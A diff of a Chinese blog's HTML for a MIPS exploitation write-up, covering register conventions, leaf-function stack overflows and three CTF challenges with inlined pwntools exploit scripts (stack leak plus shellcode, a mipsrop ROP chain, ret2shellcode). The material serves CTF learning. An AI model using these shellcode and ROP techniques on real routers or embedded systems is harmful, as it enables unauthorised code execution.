+<td style="text-align:center">中断处理函数用于保存系统参数</td>
 </tr>
 <tr>
-<td align="center">$28</td>
-<td align="center">$gp</td>
-<td align="center">global pointer，全局指针</td>
+<td style="text-align:center">$28</td>
+<td style="text-align:center">$gp</td>
+<td style="text-align:center">global pointer，全局指针</td>
 </tr>
 <tr>
-<td align="center">$29</td>
-<td align="center">$sp</td>
-<td align="center">stack pointer，堆栈指针，指向栈顶</td>
+<td style="text-align:center">$29</td>
+<td style="text-align:center">$sp</td>
+<td style="text-align:center">stack pointer，堆栈指针，指向栈顶</td>
 </tr>
 <tr>
-<td align="center">$30</td>
-<td align="center">$fp</td>
-<td align="center">frame pointer，保存栈指针（GNU）或$s8（SGI）</td>
+<td style="text-align:center">$30</td>
+<td style="text-align:center">$fp</td>
+<td style="text-align:center">frame pointer，保存栈指针（GNU）或$s8（SGI）</td>
 </tr>
 <tr>
-<td align="center">$31</td>
-<td align="center">$ra</td>
-<td align="center">return address，返回地址</td>
+<td style="text-align:center">$31</td>
+<td style="text-align:center">$ra</td>
+<td style="text-align:center">return address，返回地址</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <ul>
 <li>返回地址：直接存入 $ra，不是堆栈。但嵌套调用的时候，被调函数1会先把原 $ra 的值压入堆栈，再进行下一次调用，此时 $ra 存放的是被调函数2的返回地址。</li>
 </ul>
 <img src="https://i.loli.net/2021/07/30/uSzx8aceYWhRL9X.png" style="zoom: 50%;" />
-
 <p>栈溢出漏洞的利用在叶子和非叶子函数间的主要区别就是，覆盖的是谁的返回地址。非叶子的情况和 x86 很像，比如上图的 B 函数，栈帧中存的是自己的返回地址（A），这时栈溢出能修改的就是它本身的返回地址。而像 C 这种叶子函数，本身的返回地址在 $ra 寄存器中，但payload足够长的话，能覆盖到 B 的栈帧，修改其父函数的返回地址。</p>
-<h3 id="Mplogin"><a href="#Mplogin" class="headerlink" title="Mplogin"></a>Mplogin</h3><blockquote>
+<h3 id="Mplogin"><a class="header-anchor" href="#Mplogin">¶</a>Mplogin</h3>
+<blockquote>
 <p>mips-32-little</p>
 </blockquote>
 <p>给出了两种运行方式。一种是把 so 文件放在本地的 <code>/lib/</code> 下、直接运行，一种是用 qemu-user运行、需要指定lib路径（注意是lib文件夹，不是so文件）。前面说到异构程序的运行需要交叉编译的工具辅助，这里的第一种方式并没有用到，看来关键在动态链接库。</p>
 <img src="https://i.loli.net/2021/07/30/qwMdvBaCVAmZJo2.png"  />
-
-
-
 <p>漏洞点在输入密码的函数中。可以覆盖到 Password 输入时的长度参数位置，从而输入Passsword 时有栈溢出，也就是第二个 read 的时候。程序什么保护都没开，直接往栈上写 shellcode 跳转过去就可以了。</p>
 <img src="https://i.loli.net/2021/07/30/snO1VD5KjcYPAbH.png" style="zoom: 80%;" />
-
 <p>栈地址怎么泄露呢。输密码之前还有一个函数，看栈帧的时候发现，输入的变量v1后面就是 $fp 和 $ra 的值。输出用的是 printf 函数，v1填满时就能泄露出来。这个函数是由 main 调用的，是叶子函数。因此 $ra 存的是main的地址，$fp存的是进入这个函数前的栈顶地址。</p>
-<p><img src="https://i.loli.net/2021/07/30/59eS6fxnV3oWOdy.png"></p>
-<p>该函数执行完后栈空间会回收，栈顶变回进入前的地址，下次进入设置密码函数时的栈顶也是这里。因此泄露这个地址就相当于拿到了栈溢出漏洞函数的栈顶地址。我在调试的过程中发现，在ubuntu 16中运行程序，栈溢出泄露不出数据，换成18又可以了…… 当踩个坑吧，还不知道为何如此😰。</p>
+<p><img src="https://i.loli.net/2021/07/30/59eS6fxnV3oWOdy.png" alt=""></p>
+<p>该函数执行完后栈空间会回收，栈顶变回进入前的地址，下次进入设置密码函数时的栈顶也是这里。因此泄露这个地址就相当于拿到了栈溢出漏洞函数的栈顶地址。我在调试的过程中发现，在ubuntu 16中运行程序，栈溢出泄露不出数据，换成18又可以了… 当踩个坑吧，还不知道为何如此😰。</p>
 <img src="https://i.loli.net/2021/07/30/9b28UBcRuDTEwXv.png"  />
-
-
-
-<p>exp: </p>
-<script src="https://gist.github.com/7ee1n/c88628a278c5724ca7c79866def121ff.js"></script>
-
-<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><blockquote>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,binary=ELF(<span class="string">&#x27;./Mplogin&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./Mplogin&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mipsel&#x27;, &#x27;-L&#x27;, &#x27;./&#x27;,&#x27;-g&#x27;,&#x27;2364&#x27;, &#x27;./Mplogin&#x27;])</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./Mplogin&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">name=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">name=name.ljust(<span class="number">24</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Username :&#x27;</span>)</span><br><span class="line">sd(name)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;adminaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">stack=u32(rv(<span class="number">4</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">py=<span class="string">&#x27;access&#x27;</span></span><br><span class="line">py=py.ljust(<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">py+=p32(<span class="number">0x100</span>)</span><br><span class="line">ru(<span class="string">&#x27;Pre_Password :&#x27;</span>)</span><br><span class="line">sl(py)</span><br><span class="line"></span><br><span class="line">pwd=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">pwd=pwd.ljust(<span class="number">40</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">pwd+=p32(stack)+asm(shellcraft.sh())</span><br><span class="line">ru(<span class="string">&#x27;Password :&#x27;</span>)</span><br><span class="line">sl(pwd)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+<h3 id="pwn"><a class="header-anchor" href="#pwn">¶</a>pwn</h3>
+<blockquote>
 <p>mips-32-big</p>
 </blockquote>
 <p>程序整体逻辑是：</p>
@@ -353,57 +136,35 @@
 <li>输入组数，后创建 n 组大小为 0x24 的空间（栈上）。</li>
 <li>输入n次 id 和用户名，在对应组的位置存储。</li>
 </ol>
-<p><img src="https://i.loli.net/2021/08/05/msrNxDMJRHFkGZ8.png"></p>
+<p><img src="https://i.loli.net/2021/08/05/msrNxDMJRHFkGZ8.png" alt=""></p>
 <p>堆溢出和栈溢出（长度和id均未规定）漏洞都有。可以通过 memcpy 的溢出，覆盖到返回地址。由于堆溢出漏洞，可写入 0x300  的 payload，应该是足够长的。</p>
-<p><img src="https://i.loli.net/2021/08/05/CvfJiSY5Xm1rGb8.png"></p>
+<p><img src="https://i.loli.net/2021/08/05/CvfJiSY5Xm1rGb8.png" alt=""></p>
 <p>先确定偏移吧。说下调试过程。</p>
 <p>一开始用的是 <code>gdb-multiarch</code> ，<code>target remote</code> 后下断点，再 <code>continue</code> ，每次都报 <code>L1_MAP_ADDR_SPACE_BITS</code> 的错误或者断不下来。用 <code>ida remote debug</code> 应该可以。用移植到 ubuntu 上的 ida 会更好些，避免文件复制到 Windows 后符号链接丢失等问题。如果还是想在 qemu-user 的状态下进行尝试，还是能用 x86 的 gdb 调的：<a href="https://www.jianshu.com/p/ba12cd4e530a">路由器漏洞利用入门- 简书</a> 。但 cyclic 用起来很不方便，因为程序是用 qemu 运行的，因此要复制到脚本上再运行调试。其实直接看栈帧也可以算出来，用 <code>gdb-multiarch</code> remote 过去后，不下断点也能看到返回地址有没有被覆盖。</p>
 <p>用户名经 strchr 函数返回后，把起始位置赋给 <code>cur_i</code> 。这里的输入位置与 <code>$ra</code> 的距离 就是 <code>0x14+0x24+0x58=0x90</code> 。</p>
-<p><img src="https://i.loli.net/2021/08/05/auFLiQx4ERT3GOc.png"></p>
+<p><img src="https://i.loli.net/2021/08/05/auFLiQx4ERT3GOc.png" alt=""></p>
 <p>因为返回地址范围不合法，即使不下断点也能看出是否覆盖到了：</p>
-<p><img src="https://i.loli.net/2021/08/04/TVCcawAPIks4ndL.png"></p>
+<p><img src="https://i.loli.net/2021/08/04/TVCcawAPIks4ndL.png" alt=""></p>
 <p>接下来就是写shellcode了。堆地址、栈地址、libc没有办法泄露，加上没有开启地址随机化，可以使用 rop gadget。利用 <code>MIPSROP</code> ，找到下面的这些 gadget。基本上都是 <code>add $sp,(...)</code> 后，储存在一个寄存器 A 中，再 jmp 到另一个寄存器 B 上执行。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIPS ROP Finder activated, found 842 controllable jumps between 0x00400000 and 0x004740A0</span><br><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                       |  Control Jump                          |</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x004273C4  |  addiu $a2,$sp,0x70+var_C                     |  jalr  $s0                             |</span><br><span class="line">|  0x0042BCD0  |  addiu $a2,$sp,0x88+var_C                     |  jalr  $s2                             |</span><br><span class="line">|  0x0042FA00  |  addiu $v1,$sp,0x138+var_104                  |  jalr  $s1                             |</span><br><span class="line">|  0x004491F8  |  addiu $a2,$sp,0x44+var_C                     |  jalr  $s1                             |</span><br><span class="line">|  0x0044931C  |  addiu $v0,$sp,0x30+var_8                     |  jalr  $s1                             |</span><br><span class="line">|  0x00449444  |  addiu $a2,$sp,0x44+var_C                     |  jalr  $s1                             |</span><br><span class="line">|  0x0044AD58  |  addiu $a1,$sp,0x60+var_28                    |  jalr  $s4                             |</span><br><span class="line">|  0x0044AEFC  |  addiu $a1,$sp,0x64+var_28                    |  jalr  $s5                             |</span><br><span class="line">|  0x0044B154  |  addiu $a1,$sp,0x6C+var_38                    |  jalr  $s2                             |</span><br><span class="line">|  0x0044B1EC  |  addiu $v0,$sp,0x6C+var_40                    |  jalr  $s2                             |</span><br><span class="line">|  0x0044B3EC  |  addiu $v0,$sp,0x170+var_130                  |  jalr  $s0                             |</span><br><span class="line">|  0x00454E94  |  addiu $s7,$sp,0xB8+var_98                    |  jalr  $s3                             |</span><br><span class="line">|  0x00465BEC  |  addiu $a1,$sp,0xC4+var_98                    |  jalr  $s0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 13 matching gadgets</span><br></pre></td></tr></table></figure>
-
-
-
 <p>显然 addiu 到寄存器 A 的内容是我们输入的、可控的，可以在这范围内写 shellcode。之后 jmp 到寄存器 B，就需要再 jmp 回来到 A 存储的位置执行 shellcode。比如上面的第一条 gadget ，$s0 的内容应该是 <code>jmp $a2</code>，第二条gadget的 $s2 应该是 <code>jmp $a2</code>。而这些 s  寄存器在 MIPS 中是用于 <code>saved value</code>  的，有保存现场就会有恢复现场，因此在每个函数末尾 return 的时候都会有  <code>lw $s?,?+var_?($sp)</code> 的操作。前面 <code>loc_400a2c</code> 的图就是这个 pwn 函数的返回步骤，可以看到 <code>$s0~$s7</code>全用上了，用 mipsrop 找到的 gadgets 都可用，可通过栈上的内容来控制 s寄存器的内容。从一个寄存器 jmp 到另一个寄存器，用的是临时寄存器，一般用 $t9：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python&gt;mipsrop.find(&quot;move $t9,$a2&quot;)</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                      |  Control Jump                          |</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00421684  |  move $t9,$a2                                |  jr    $a2                             |</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
-
-
-
 <p>算好 $s0 、$a2的位置就可以了。用其他 gadget 的话，改下offset就可以了。</p>
-<script src="https://gist.github.com/7ee1n/198ad44fd9e310ad7412d165d5c5d3fc.js"></script>
-
-
-
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># from struct import pack</span></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,bits=<span class="number">32</span>,endian=<span class="string">&#x27;big&#x27;</span>,binary=ELF(<span class="string">&#x27;./pwn2&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mips&#x27;, &#x27;-g&#x27;,&#x27;2230&#x27;, &#x27;./pwn2&#x27;])</span></span><br><span class="line"><span class="comment"># rop = ROP(context.binary)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#$0 offset: $cur_i+0x58+0x14=$cur_i+0x6c</span></span><br><span class="line"><span class="comment">#shellcode offset: $sp+0x70+var_c=$sp+0x70-0x0c=$sp+0x64</span></span><br><span class="line">jmp_a2=<span class="number">0x00421684</span><span class="comment">#jr $a2</span></span><br><span class="line">gadget=<span class="number">0x004273C4</span><span class="comment">#jr $s0</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))#0x7c</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;.\&#x27; \n&#x27;</span>)</span><br><span class="line">py=<span class="string">&#x27;1:&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(jmp_a2)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x6c</span>-<span class="number">4</span>)+p32(gadget)</span><br><span class="line">py+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span>+shellcode+<span class="string">&#x27;.&#x27;</span></span><br><span class="line">sl(py)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
 <p>顺便提一下，如果 ubuntu16 下的 shellcode 生成不了，可以检查下是不是 binutils 缺少 mips 架构版本的问题，正常来说应该是会返回一个 gnu 数组的。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import*</span><br><span class="line">&gt;&gt;&gt; pwnlib.asm.dpkg_search_for_binutils(&#x27;mips&#x27;, &#x27;as&#x27;)</span><br><span class="line">[&#x27;binutils-mips-linux-gnu&#x27;, &#x27;binutils-mipsel-linux-gnu&#x27;]</span><br></pre></td></tr></table></figure>
-
-
-
 <p>原因是 ubuntu 16 自带的 binutils 版本旧，安装下对应的 gnu 就可以了。或者用 ubuntu18 以上的版本。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install binutils-mips-linux-gnu</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="ctfshow-内部赛-babystack"><a href="#ctfshow-内部赛-babystack" class="headerlink" title="ctfshow 内部赛 babystack"></a>ctfshow 内部赛 babystack</h3><blockquote>
+<h3 id="ctfshow-内部赛-babystack"><a class="header-anchor" href="#ctfshow-内部赛-babystack">¶</a>ctfshow 内部赛 babystack</h3>
+<blockquote>
 <p>mips-32-little</p>
 </blockquote>
 <p>ret2shellcode：</p>
-<script src="https://gist.github.com/7ee1n/f8bcac8dd2987a4f7e85623ac36afc01.js"></script>
-
-
-
-
-
-
-
-<h2 id="2-2-堆漏洞"><a href="#2-2-堆漏洞" class="headerlink" title="2.2 堆漏洞"></a>2.2 堆漏洞</h2>]]></content>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># from struct import pack</span></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,bits=<span class="number">32</span>,endian=<span class="string">&#x27;little&#x27;</span>,binary=ELF(<span class="string">&#x27;./main&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mipsel&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;-g&#x27;,&#x27;2230&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line"><span class="comment"># rop = ROP(context.binary)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">name=<span class="number">0x00410C20</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">sl(shellcode)</span><br><span class="line">ru(<span class="string">&#x27;message:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x34</span>+p32(name))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+<h2 id="2-2-堆漏洞"><a class="header-anchor" href="#2-2-堆漏洞">¶</a>2.2 堆漏洞</h2>
+]]></content>
       <categories>
-        <category>note</category>
+        <category>mips</category>
       </categories>
       <tags>
         <tag>mips</tag>
